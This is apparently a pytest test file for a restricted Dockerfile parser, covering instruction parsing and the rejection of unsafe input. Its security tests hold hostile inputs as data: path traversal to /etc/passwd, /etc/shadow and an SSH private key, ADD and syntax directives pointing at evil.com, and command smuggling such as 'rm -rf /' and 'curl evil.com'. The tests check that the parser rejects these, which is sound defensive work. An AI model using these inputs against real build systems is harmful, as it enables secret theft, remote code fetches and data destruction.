"""Tests for the Dockerfile parser."""

from __future__ import annotations

from unittest.mock import AsyncMock, patch, MagicMock

import httpx
import pytest

from src.agent.dockerfile import (
    DOCKER_IMAGES,
    DockerfileParsed,
    PREBUILT_ALIASES,
    parse_dockerfile,
    validate_docker_image,
)


# ---------------------------------------------------------------------------
# Parser tests — basic instructions
# ---------------------------------------------------------------------------


class TestParseBasic:
    def test_simple_from_entrypoint(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.from_image == "ouro-ubuntu"
        assert parsed.entrypoint_cmd == ["bash", "job.sh"]
        assert not parsed.needs_build

    def test_from_with_tag(self):
        parsed = parse_dockerfile('FROM python:3.12-slim\nENTRYPOINT ["python", "main.py"]')
        assert parsed.from_image == "python:3.12-slim"
        assert parsed.needs_build  # Not a prebuilt alias

    def test_from_with_digest(self):
        digest = "a" * 64
        parsed = parse_dockerfile(f'FROM python@sha256:{digest}\nCMD ["python", "app.py"]')
        assert parsed.from_image == f"python@sha256:{digest}"
        assert parsed.needs_build


class TestParseRun:
    def test_run_single(self):
        parsed = parse_dockerfile('FROM ouro-python\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
        assert parsed.run_commands == ["pip install pandas"]
        assert parsed.needs_build  # Has RUN commands

    def test_run_multiple(self):
        parsed = parse_dockerfile(
            'FROM ouro-python\nRUN pip install pandas\nRUN pip install numpy\nENTRYPOINT ["python", "main.py"]'
        )
        assert parsed.run_commands == ["pip install pandas", "pip install numpy"]

    def test_run_backslash_continuation(self):
        dockerfile = 'FROM ouro-python\nRUN pip install \\\n    pandas \\\n    numpy\nENTRYPOINT ["python", "main.py"]'
        parsed = parse_dockerfile(dockerfile)
        assert len(parsed.run_commands) == 1
        assert "pandas" in parsed.run_commands[0]
        assert "numpy" in parsed.run_commands[0]


class TestParseEnv:
    def test_env_equals(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nENV FOO=bar\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.env_vars == {"FOO": "bar"}
        assert parsed.needs_build  # Has ENV

    def test_env_space(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nENV FOO bar\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.env_vars == {"FOO": "bar"}

    def test_env_multiple_equals(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nENV FOO=bar BAZ=qux\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.env_vars == {"FOO": "bar", "BAZ": "qux"}

    def test_env_quoted_value(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nENV FOO="hello world"\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.env_vars == {"FOO": "hello world"}


class TestParseWorkdir:
    def test_workdir(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nWORKDIR /app\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.workdir == "/app"
        assert parsed.needs_build  # Has WORKDIR


class TestParseEntrypoint:
    def test_exec_form(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nENTRYPOINT ["python", "main.py"]')
        assert parsed.entrypoint_cmd == ["python", "main.py"]

    def test_shell_form(self):
        parsed = parse_dockerfile("FROM ouro-ubuntu\nENTRYPOINT python main.py")
        assert parsed.entrypoint_cmd == ["bash", "-c", "python main.py"]

    def test_cmd_as_entrypoint(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nCMD ["python", "main.py"]')
        assert parsed.entrypoint_cmd == ["python", "main.py"]

    def test_entrypoint_over_cmd(self):
        """When both ENTRYPOINT and CMD are set, ENTRYPOINT wins."""
        parsed = parse_dockerfile(
            'FROM ouro-ubuntu\nCMD ["default.sh"]\nENTRYPOINT ["python", "main.py"]'
        )
        assert parsed.entrypoint_cmd == ["python", "main.py"]

    def test_no_entrypoint_no_cmd(self):
        with pytest.raises(ValueError, match="ENTRYPOINT or CMD"):
            parse_dockerfile("FROM ouro-ubuntu")

    def test_no_entrypoint_no_cmd_not_required_prebuilt(self):
        """When require_entrypoint=False on a prebuilt image, missing ENTRYPOINT/CMD returns empty list."""
        parsed = parse_dockerfile("FROM ouro-python\nRUN pip install cowsay\nWORKDIR /workspace", require_entrypoint=False)
        assert parsed.from_image == "ouro-python"
        assert parsed.entrypoint_cmd == []
        assert parsed.needs_build
        assert not parsed.is_external_image

    def test_no_entrypoint_external_image_raises(self):
        """External images without ENTRYPOINT/CMD raise even with require_entrypoint=False."""
        with pytest.raises(ValueError, match="External image.*requires ENTRYPOINT or CMD"):
            parse_dockerfile("FROM ruby:latest", require_entrypoint=False)

    def test_external_image_with_entrypoint_succeeds(self):
        """External images with ENTRYPOINT succeed with require_entrypoint=False."""
        parsed = parse_dockerfile('FROM ruby:latest\nENTRYPOINT ["ruby", "hello.rb"]', require_entrypoint=False)
        assert parsed.from_image == "ruby:latest"
        assert parsed.entrypoint_cmd == ["ruby", "hello.rb"]
        assert parsed.is_external_image

    def test_no_from(self):
        with pytest.raises(ValueError, match="FROM"):
            parse_dockerfile('ENTRYPOINT ["bash", "job.sh"]')


class TestParseEdgeCases:
    def test_comments_and_empty_lines(self):
        dockerfile = """
# This is a comment
FROM ouro-ubuntu

# Another comment
ENTRYPOINT ["bash", "job.sh"]
"""
        parsed = parse_dockerfile(dockerfile)
        assert parsed.from_image == "ouro-ubuntu"
        assert parsed.entrypoint_cmd == ["bash", "job.sh"]

    def test_unknown_instructions_silently_ignored(self):
        """Truly unknown instructions are silently ignored for forward compat."""
        dockerfile = """FROM ouro-ubuntu
FUTUREINSTRUCTION something
ENTRYPOINT ["bash", "job.sh"]
"""
        parsed = parse_dockerfile(dockerfile)
        assert parsed.from_image == "ouro-ubuntu"


# ---------------------------------------------------------------------------
# ARG tests
# ---------------------------------------------------------------------------


class TestParseArg:
    def test_arg_basic(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nARG VERSION\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.arg_vars == {"VERSION": None}

    def test_arg_with_default(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nARG VERSION=1.0\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.arg_vars == {"VERSION": "1.0"}

    def test_arg_with_quoted_default(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nARG MSG="hello world"\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.arg_vars == {"MSG": "hello world"}

    def test_arg_substitution_in_run(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nARG PY_VERSION=3.12\nRUN pip install python==$PY_VERSION\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.run_commands == ["pip install python==3.12"]

    def test_arg_substitution_braces(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nARG PY_VERSION=3.12\nRUN pip install python==${PY_VERSION}\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.run_commands == ["pip install python==3.12"]

    def test_arg_substitution_in_env(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nARG VER=1.0\nENV APP_VERSION=$VER\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.env_vars == {"APP_VERSION": "1.0"}

    def test_arg_substitution_in_workdir(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nARG DIR=/app\nWORKDIR $DIR\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.workdir == "/app"

    def test_arg_no_value_left_as_is(self):
        """ARG with no default value — references are left unsubstituted."""
        parsed = parse_dockerfile('FROM ouro-ubuntu\nARG UNSET\nRUN echo $UNSET\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.run_commands == ["echo $UNSET"]

    def test_arg_invalid_name(self):
        with pytest.raises(ValueError, match="Invalid ARG name"):
            parse_dockerfile('FROM ouro-ubuntu\nARG 1BAD=val\nENTRYPOINT ["bash", "job.sh"]')


# ---------------------------------------------------------------------------
# COPY tests
# ---------------------------------------------------------------------------


class TestParseCopy:
    def test_copy_basic(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nCOPY requirements.txt /app/requirements.txt\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("requirements.txt", "/app/requirements.txt")]
        assert parsed.needs_build

    def test_copy_to_workdir_relative(self):
        """COPY with relative dest resolves against WORKDIR."""
        parsed = parse_dockerfile('FROM ouro-ubuntu\nWORKDIR /app\nCOPY requirements.txt .\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("requirements.txt", "/app/requirements.txt")]

    def test_copy_to_root_relative(self):
        """COPY with relative dest and no WORKDIR resolves against /."""
        parsed = parse_dockerfile('FROM ouro-ubuntu\nCOPY requirements.txt .\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("requirements.txt", "/requirements.txt")]

    def test_copy_to_dir_with_slash(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nCOPY file.txt /app/\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("file.txt", "/app/file.txt")]

    def test_copy_multiple_sources(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nCOPY file1.txt file2.txt /app/\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [
            ("file1.txt", "/app/file1.txt"),
            ("file2.txt", "/app/file2.txt"),
        ]

    def test_copy_json_form(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nCOPY ["requirements.txt", "/app/requirements.txt"]\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("requirements.txt", "/app/requirements.txt")]

    def test_copy_strips_chown(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nCOPY --chown=1000:1000 file.txt /app/file.txt\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("file.txt", "/app/file.txt")]

    def test_copy_strips_chmod(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nCOPY --chmod=755 file.txt /app/file.txt\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("file.txt", "/app/file.txt")]

    def test_copy_needs_build_on_prebuilt(self):
        """COPY on a prebuilt alias triggers needs_build."""
        parsed = parse_dockerfile('FROM ouro-python\nCOPY requirements.txt /app/requirements.txt\nENTRYPOINT ["python", "main.py"]')
        assert parsed.needs_build

    def test_copy_reset_on_from(self):
        """Copy instructions reset on each FROM — but multi-stage is now rejected."""
        # Single FROM with COPY works
        parsed = parse_dockerfile('FROM ouro-ubuntu\nCOPY requirements.txt /app/requirements.txt\nENTRYPOINT ["bash", "job.sh"]')
        assert len(parsed.copy_instructions) == 1


class TestCopyFromRejected:
    def test_copy_from_rejected(self):
        with pytest.raises(ValueError, match="COPY --from is not supported"):
            parse_dockerfile('FROM ouro-ubuntu\nCOPY --from=builder /app /app\nENTRYPOINT ["bash", "job.sh"]')


class TestCopyDestResolution:
    def test_dest_dot_with_workdir(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nWORKDIR /app\nCOPY file.txt .\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("file.txt", "/app/file.txt")]

    def test_dest_dir_slash_with_workdir(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nWORKDIR /app\nCOPY file.txt ./sub/\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("file.txt", "/app/sub/file.txt")]

    def test_dest_absolute_ignores_workdir(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nWORKDIR /app\nCOPY file.txt /opt/file.txt\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("file.txt", "/opt/file.txt")]

    def test_no_workdir_defaults_to_root(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nCOPY file.txt .\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("file.txt", "/file.txt")]


# ---------------------------------------------------------------------------
# COPY security tests
# ---------------------------------------------------------------------------


class TestCopyPathTraversal:
    def test_parent_traversal(self):
        with pytest.raises(ValueError, match="Path traversal"):
            parse_dockerfile('FROM ouro-ubuntu\nCOPY ../etc/passwd /app/\nENTRYPOINT ["bash", "job.sh"]')

    def test_deep_traversal(self):
        with pytest.raises(ValueError, match="Path traversal"):
            parse_dockerfile('FROM ouro-ubuntu\nCOPY ../../root/.ssh/id_rsa /app/\nENTRYPOINT ["bash", "job.sh"]')

    def test_hidden_traversal(self):
        with pytest.raises(ValueError, match="Path traversal"):
            parse_dockerfile('FROM ouro-ubuntu\nCOPY foo/../../etc/shadow /app/\nENTRYPOINT ["bash", "job.sh"]')


class TestCopyAbsoluteSrc:
    def test_absolute_path_rejected(self):
        with pytest.raises(ValueError, match="Absolute paths"):
            parse_dockerfile('FROM ouro-ubuntu\nCOPY /etc/passwd /app/\nENTRYPOINT ["bash", "job.sh"]')


class TestCopyNullBytes:
    def test_null_bytes_rejected(self):
        with pytest.raises(ValueError, match="Null bytes"):
            parse_dockerfile('FROM ouro-ubuntu\nCOPY file\x00.txt /app/\nENTRYPOINT ["bash", "job.sh"]')


class TestCopyGlobRejected:
    def test_star_glob_rejected(self):
        with pytest.raises(ValueError, match="Glob patterns"):
            parse_dockerfile('FROM ouro-ubuntu\nCOPY *.py /app/\nENTRYPOINT ["bash", "job.sh"]')

    def test_double_star_glob_rejected(self):
        with pytest.raises(ValueError, match="Glob patterns"):
            parse_dockerfile('FROM ouro-ubuntu\nCOPY src/**/*.js /app/\nENTRYPOINT ["bash", "job.sh"]')

    def test_question_mark_glob_rejected(self):
        with pytest.raises(ValueError, match="Glob patterns"):
            parse_dockerfile('FROM ouro-ubuntu\nCOPY file?.txt /app/\nENTRYPOINT ["bash", "job.sh"]')


# ---------------------------------------------------------------------------
# ADD tests
# ---------------------------------------------------------------------------


class TestParseAdd:
    def test_add_local_works(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nADD data.tar.gz /data/data.tar.gz\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.copy_instructions == [("data.tar.gz", "/data/data.tar.gz")]
        assert parsed.needs_build


class TestAddUrlRejected:
    def test_http_url_rejected(self):
        with pytest.raises(ValueError, match="ADD with URLs is not supported"):
            parse_dockerfile('FROM ouro-ubuntu\nADD http://evil.com/payload /app/\nENTRYPOINT ["bash", "job.sh"]')

    def test_https_url_rejected(self):
        with pytest.raises(ValueError, match="ADD with URLs is not supported"):
            parse_dockerfile('FROM ouro-ubuntu\nADD https://evil.com/payload /app/\nENTRYPOINT ["bash", "job.sh"]')


# ---------------------------------------------------------------------------
# ARG substitution security tests
# ---------------------------------------------------------------------------


class TestArgSubstitutionSecurity:
    def test_arg_traversal_in_copy_rejected(self):
        """ARG value with ../ substituted into COPY src is rejected after substitution."""
        with pytest.raises(ValueError, match="Path traversal"):
            parse_dockerfile('FROM ouro-ubuntu\nARG SRC=../../../etc/passwd\nCOPY $SRC /app/\nENTRYPOINT ["bash", "job.sh"]')

    def test_arg_absolute_in_copy_rejected(self):
        with pytest.raises(ValueError, match="Absolute paths"):
            parse_dockerfile('FROM ouro-ubuntu\nARG SRC=/etc/passwd\nCOPY $SRC /app/\nENTRYPOINT ["bash", "job.sh"]')

    def test_arg_glob_in_copy_rejected(self):
        with pytest.raises(ValueError, match="Glob patterns"):
            parse_dockerfile('FROM ouro-ubuntu\nARG SRC=*.py\nCOPY $SRC /app/\nENTRYPOINT ["bash", "job.sh"]')


# ---------------------------------------------------------------------------
# LABEL tests
# ---------------------------------------------------------------------------


class TestParseLabel:
    def test_label_equals_form(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nLABEL version=1.0\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.labels == {"version": "1.0"}

    def test_label_space_form(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nLABEL maintainer test@example.com\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.labels == {"maintainer": "test@example.com"}

    def test_label_multiple_equals(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nLABEL version=1.0 author="test"\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.labels["version"] == "1.0"
        assert parsed.labels["author"] == "test"


class TestLabelNewlineStripped:
    def test_newline_in_label_stripped(self):
        """Label values with embedded newlines are sanitized."""
        parsed = parse_dockerfile('FROM ouro-ubuntu\nLABEL desc="safe value"\nENTRYPOINT ["bash", "job.sh"]')
        assert "\n" not in parsed.labels["desc"]


# ---------------------------------------------------------------------------
# SHELL tests
# ---------------------------------------------------------------------------


class TestParseShell:
    def test_shell_parsed(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nSHELL ["/bin/bash", "-c"]\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.shell == ["/bin/bash", "-c"]

    def test_shell_non_json_rejected(self):
        with pytest.raises(ValueError, match="SHELL must use JSON exec form"):
            parse_dockerfile('FROM ouro-ubuntu\nSHELL /bin/bash -c\nENTRYPOINT ["bash", "job.sh"]')

    def test_shell_non_list_rejected(self):
        with pytest.raises(ValueError, match="SHELL must use JSON exec form"):
            parse_dockerfile('FROM ouro-ubuntu\nSHELL "bash"\nENTRYPOINT ["bash", "job.sh"]')

    def test_shell_non_string_elements_rejected(self):
        with pytest.raises(ValueError, match="SHELL must be a JSON array of strings"):
            parse_dockerfile('FROM ouro-ubuntu\nSHELL [1, 2]\nENTRYPOINT ["bash", "job.sh"]')


# ---------------------------------------------------------------------------
# EXPOSE tests
# ---------------------------------------------------------------------------


class TestParseExpose:
    def test_expose_stored_as_label(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nEXPOSE 8080\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.labels.get("ouro.exposed_ports") == "8080"

    def test_expose_multiple_ports(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nEXPOSE 8080\nEXPOSE 9090/tcp\nENTRYPOINT ["bash", "job.sh"]')
        assert "8080" in parsed.labels["ouro.exposed_ports"]
        assert "9090/tcp" in parsed.labels["ouro.exposed_ports"]

    def test_expose_no_needs_build(self):
        """EXPOSE alone on a prebuilt alias does not trigger needs_build."""
        parsed = parse_dockerfile('FROM ouro-ubuntu\nEXPOSE 8080\nENTRYPOINT ["bash", "job.sh"]')
        # EXPOSE stores as label, labels don't trigger needs_build
        assert not parsed.needs_build


# ---------------------------------------------------------------------------
# Rejected instructions
# ---------------------------------------------------------------------------


class TestRejected:
    def test_user_rejected(self):
        with pytest.raises(ValueError, match="USER is not supported"):
            parse_dockerfile('FROM ouro-ubuntu\nUSER nobody\nENTRYPOINT ["bash", "job.sh"]')

    def test_volume_rejected(self):
        with pytest.raises(ValueError, match="VOLUME is not supported"):
            parse_dockerfile('FROM ouro-ubuntu\nVOLUME /data\nENTRYPOINT ["bash", "job.sh"]')

    def test_healthcheck_rejected(self):
        with pytest.raises(ValueError, match="HEALTHCHECK is not supported"):
            parse_dockerfile('FROM ouro-ubuntu\nHEALTHCHECK CMD curl -f http://localhost/\nENTRYPOINT ["bash", "job.sh"]')

    def test_stopsignal_rejected(self):
        with pytest.raises(ValueError, match="STOPSIGNAL is not supported"):
            parse_dockerfile('FROM ouro-ubuntu\nSTOPSIGNAL SIGTERM\nENTRYPOINT ["bash", "job.sh"]')

    def test_onbuild_rejected(self):
        with pytest.raises(ValueError, match="ONBUILD is not supported"):
            parse_dockerfile('FROM ouro-ubuntu\nONBUILD RUN echo hello\nENTRYPOINT ["bash", "job.sh"]')


# ---------------------------------------------------------------------------
# needs_build tests
# ---------------------------------------------------------------------------


class TestNeedsBuild:
    def test_prebuilt_no_run_no_build(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nENTRYPOINT ["bash", "job.sh"]')
        assert not parsed.needs_build

    def test_prebuilt_with_run_needs_build(self):
        parsed = parse_dockerfile('FROM ouro-python\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
        assert parsed.needs_build

    def test_real_image_needs_build(self):
        parsed = parse_dockerfile('FROM python:3.12-slim\nENTRYPOINT ["python", "main.py"]')
        assert parsed.needs_build

    def test_prebuilt_with_env_needs_build(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nENV FOO=bar\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.needs_build

    def test_prebuilt_with_workdir_needs_build(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nWORKDIR /app\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.needs_build

    def test_prebuilt_with_copy_needs_build(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nCOPY file.txt /app/file.txt\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.needs_build

    def test_all_prebuilt_aliases(self):
        """All prebuilt aliases should not need build when used alone."""
        for alias in PREBUILT_ALIASES:
            parsed = parse_dockerfile(f'FROM {alias}\nENTRYPOINT ["bash", "job.sh"]')
            assert not parsed.needs_build, f"Alias '{alias}' should not need build"


# ---------------------------------------------------------------------------
# Docker image mapping tests
# ---------------------------------------------------------------------------


class TestDockerImages:
    def test_all_aliases_have_docker_images(self):
        for alias in ("ouro-ubuntu", "ouro-python", "ouro-nodejs"):
            assert alias in DOCKER_IMAGES
            assert ":" in DOCKER_IMAGES[alias]

    def test_prebuilt_aliases_are_docker_images(self):
        assert PREBUILT_ALIASES is DOCKER_IMAGES


# ---------------------------------------------------------------------------
# RUN --mount rejection tests
# ---------------------------------------------------------------------------


class TestRunMountRejected:
    def test_mount_bind_rejected(self):
        with pytest.raises(ValueError, match="--mount"):
            parse_dockerfile("FROM ubuntu:22.04\nRUN --mount=type=bind,source=/etc,target=/mnt cat /mnt/shadow\nCMD bash")

    def test_mount_secret_rejected(self):
        with pytest.raises(ValueError, match="--mount"):
            parse_dockerfile("FROM ubuntu:22.04\nRUN --mount=type=secret,id=mysecret cat /run/secrets/mysecret\nCMD bash")

    def test_mount_via_arg_substitution_rejected(self):
        """ARG substitution must not bypass --mount check."""
        with pytest.raises(ValueError, match="--mount"):
            parse_dockerfile("FROM ubuntu:22.04\nARG X=--mount=type=bind,source=/etc,target=/mnt\nRUN $X cat /mnt/shadow\nCMD bash")


# ---------------------------------------------------------------------------
# # syntax= directive rejection tests
# ---------------------------------------------------------------------------


class TestSyntaxDirectiveRejected:
    def test_syntax_directive_rejected(self):
        with pytest.raises(ValueError, match="syntax"):
            parse_dockerfile("# syntax=evil.com/backdoor:latest\nFROM ubuntu:22.04\nCMD bash")

    def test_syntax_directive_no_space_rejected(self):
        with pytest.raises(ValueError, match="syntax"):
            parse_dockerfile("#syntax=evil.com/backdoor:latest\nFROM ubuntu:22.04\nCMD bash")


# ---------------------------------------------------------------------------
# Multi-stage build rejection tests
# ---------------------------------------------------------------------------


class TestMultiStageRejected:
    def test_two_from_rejected(self):
        with pytest.raises(ValueError, match="Multi-stage"):
            parse_dockerfile("FROM python:3.12\nRUN pip install x\nFROM alpine:3.19\nCMD sh")

    def test_single_from_allowed(self):
        parsed = parse_dockerfile("FROM python:3.12\nCMD python")
        assert parsed.from_image == "python:3.12"


# ---------------------------------------------------------------------------
# needs_docker_build tests
# ---------------------------------------------------------------------------


class TestNeedsDockerBuild:
    def test_from_only_no_docker_build(self):
        parsed = parse_dockerfile("FROM ruby:latest\nENTRYPOINT [\"ruby\", \"hello.rb\"]")
        assert parsed.needs_build is True  # not a prebuilt alias
        assert parsed.needs_docker_build is False  # no RUN/COPY/ENV

    def test_from_with_run_needs_docker_build(self):
        parsed = parse_dockerfile("FROM ruby:latest\nRUN gem install rails\nCMD ruby")
        assert parsed.needs_docker_build is True

    def test_from_with_env_needs_docker_build(self):
        parsed = parse_dockerfile("FROM ruby:latest\nENV GEM_HOME=/usr/local\nCMD ruby")
        assert parsed.needs_docker_build is True

    def test_from_with_copy_needs_docker_build(self):
        parsed = parse_dockerfile("FROM ruby:latest\nCOPY app.rb /app/app.rb\nCMD ruby")
        assert parsed.needs_docker_build is True

    def test_from_with_workdir_needs_docker_build(self):
        parsed = parse_dockerfile("FROM ruby:latest\nWORKDIR /app\nCMD ruby")
        assert parsed.needs_docker_build is True

    def test_prebuilt_no_build(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.needs_build is False
        assert parsed.needs_docker_build is False


# ---------------------------------------------------------------------------
# Security validation tests
# ---------------------------------------------------------------------------


class TestSecurityValidation:
    # -- ENV injection --
    def test_env_key_semicolon_rejected(self):
        """Space form: ENV KEY VALUE — semicolon in key is rejected."""
        with pytest.raises(ValueError, match="Invalid ENV key"):
            parse_dockerfile('FROM ouro-ubuntu\nENV FOO;BAR value\nENTRYPOINT ["bash", "job.sh"]')

    def test_env_key_starts_with_digit_rejected(self):
        with pytest.raises(ValueError, match="Invalid ENV key"):
            parse_dockerfile('FROM ouro-ubuntu\nENV 1FOO=val\nENTRYPOINT ["bash", "job.sh"]')

    def test_env_key_valid(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nENV _MY_VAR_2=val\nENTRYPOINT ["bash", "job.sh"]')
        assert "_MY_VAR_2" in parsed.env_vars

    # -- WORKDIR injection --
    def test_workdir_injection_semicolon_rejected(self):
        with pytest.raises(ValueError, match="Invalid WORKDIR"):
            parse_dockerfile('FROM ouro-ubuntu\nWORKDIR /app; rm -rf /\nENTRYPOINT ["bash", "job.sh"]')

    def test_workdir_injection_subshell_rejected(self):
        with pytest.raises(ValueError, match="Invalid WORKDIR"):
            parse_dockerfile('FROM ouro-ubuntu\nWORKDIR /app$(whoami)\nENTRYPOINT ["bash", "job.sh"]')

    def test_workdir_relative_rejected(self):
        with pytest.raises(ValueError, match="Invalid WORKDIR"):
            parse_dockerfile('FROM ouro-ubuntu\nWORKDIR app\nENTRYPOINT ["bash", "job.sh"]')

    def test_workdir_valid_nested(self):
        parsed = parse_dockerfile('FROM ouro-ubuntu\nWORKDIR /app/src/main\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.workdir == "/app/src/main"

    # -- FROM image validation --
    def test_from_path_traversal_rejected(self):
        with pytest.raises(ValueError, match="Invalid FROM image"):
            parse_dockerfile('FROM ../../../../etc/passwd\nENTRYPOINT ["bash", "job.sh"]')

    def test_from_injection_rejected(self):
        with pytest.raises(ValueError, match="Invalid FROM image"):
            parse_dockerfile('FROM python;curl evil.com\nENTRYPOINT ["bash", "job.sh"]')

    def test_from_valid_registry(self):
        parsed = parse_dockerfile('FROM nvidia/cuda:12.0-runtime\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.from_image == "nvidia/cuda:12.0-runtime"

    def test_from_valid_ghcr(self):
        parsed = parse_dockerfile('FROM ghcr.io/owner/repo:v1.0\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.from_image == "ghcr.io/owner/repo:v1.0"

    def test_from_prebuilt_alias_bypasses_regex(self):
        """Prebuilt aliases like 'ouro-ubuntu' should pass even if regex wouldn't match."""
        for alias in PREBUILT_ALIASES:
            parsed = parse_dockerfile(f'FROM {alias}\nENTRYPOINT ["bash", "job.sh"]')
            assert parsed.from_image == alias


# ---------------------------------------------------------------------------
# Integration / combined feature tests
# ---------------------------------------------------------------------------


class TestExternalImageWithBuildInstructions:
    """External Docker images with RUN/COPY/ENV set needs_docker_build=True and extract entrypoint."""

    def test_external_image_with_run_needs_docker_build(self):
        parsed = parse_dockerfile("FROM ubuntu:22.04\nRUN apt-get update\nENTRYPOINT [\"bash\", \"job.sh\"]")
        assert parsed.from_image == "ubuntu:22.04"
        assert parsed.is_external_image
        assert parsed.needs_build
        assert parsed.needs_docker_build
        assert parsed.entrypoint_cmd == ["bash", "job.sh"]

    def test_external_image_with_run_and_copy(self):
        parsed = parse_dockerfile(
            "FROM python:3.12-slim\n"
            "COPY requirements.txt /app/requirements.txt\n"
            "RUN pip install -r /app/requirements.txt\n"
            "COPY main.py /app/main.py\n"
            'ENTRYPOINT ["python", "/app/main.py"]'
        )
        assert parsed.from_image == "python:3.12-slim"
        assert parsed.is_external_image
        assert parsed.needs_docker_build
        assert parsed.entrypoint_cmd == ["python", "/app/main.py"]
        assert len(parsed.copy_instructions) == 2

    def test_external_image_without_build_instructions(self):
        """External image with only ENTRYPOINT — needs_build but not needs_docker_build."""
        parsed = parse_dockerfile('FROM ruby:latest\nENTRYPOINT ["ruby", "hello.rb"]')
        assert parsed.is_external_image
        assert parsed.needs_build
        assert not parsed.needs_docker_build


class TestCombinedFeatures:
    def test_full_dockerfile(self):
        """A realistic Dockerfile using many supported instructions."""
        dockerfile = """FROM python:3.12-slim
ARG PIP_INDEX_URL=https://pypi.org/simple
LABEL version=1.0
WORKDIR /app
COPY requirements.txt /app/requirements.txt
RUN pip install --no-cache-dir -r /app/requirements.txt --index-url $PIP_INDEX_URL
COPY main.py /app/main.py
ENV PYTHONUNBUFFERED=1
EXPOSE 8080
ENTRYPOINT ["python", "main.py"]
"""
        parsed = parse_dockerfile(dockerfile)
        assert parsed.from_image == "python:3.12-slim"
        assert parsed.workdir == "/app"
        assert len(parsed.copy_instructions) == 2
        assert parsed.copy_instructions[0] == ("requirements.txt", "/app/requirements.txt")
        assert parsed.copy_instructions[1] == ("main.py", "/app/main.py")
        assert "https://pypi.org/simple" in parsed.run_commands[0]
        assert parsed.env_vars == {"PYTHONUNBUFFERED": "1"}
        assert parsed.labels["version"] == "1.0"
        assert "8080" in parsed.labels["ouro.exposed_ports"]
        assert parsed.needs_build
        assert parsed.needs_docker_build
        assert parsed.entrypoint_cmd == ["python", "main.py"]

    def test_arg_substitution_with_copy(self):
        """ARG values are substituted into COPY args before validation."""
        parsed = parse_dockerfile(
            'FROM ouro-ubuntu\nARG DIR=src\nCOPY $DIR /app/src\nENTRYPOINT ["bash", "job.sh"]'
        )
        assert parsed.copy_instructions == [("src", "/app/src")]


# ---------------------------------------------------------------------------
